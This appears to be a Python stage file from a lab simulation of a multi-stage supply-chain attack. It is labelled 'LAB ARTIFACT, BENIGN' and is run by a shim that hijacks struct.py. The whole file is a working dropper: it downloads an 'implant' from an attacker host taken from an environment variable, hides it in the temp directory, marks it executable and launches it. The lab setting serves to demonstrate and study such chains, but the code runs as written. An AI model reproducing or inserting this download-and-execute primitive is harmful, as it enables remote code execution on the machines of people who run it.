# stage2.py  --  LAB ARTIFACT, BENIGN.
#
# Stage 4/5 bridge. Downloaded and exec()'d by the isolated child interpreter that
# the struct.py shim spawned. Fetches the "native implant", drops it, marks it
# executable, and launches it -- the download-then-chmod+x-then-run primitive.
import os, urllib.request, subprocess, stat, tempfile

ATTACKER = os.environ.get("LAB_ATTACKER", "catalogue:8000")
print(f"[stage4] LAB-BENIGN-BEACON remote stage running (pid {os.getpid()}), "
      f"fetching implant from {ATTACKER}", flush=True)

implant = os.path.join(tempfile.gettempdir(), ".lab_implant")
with urllib.request.urlopen(f"http://{ATTACKER}/implant") as r:
    open(implant, "wb").write(r.read())

# chmod +x  (stage 5 primitive)
os.chmod(implant, os.stat(implant).st_mode | stat.S_IEXEC | stat.S_IXGRP | stat.S_IXOTH)
print(f"[stage4] wrote + chmod+x {implant}; launching native implant", flush=True)
subprocess.run([implant])
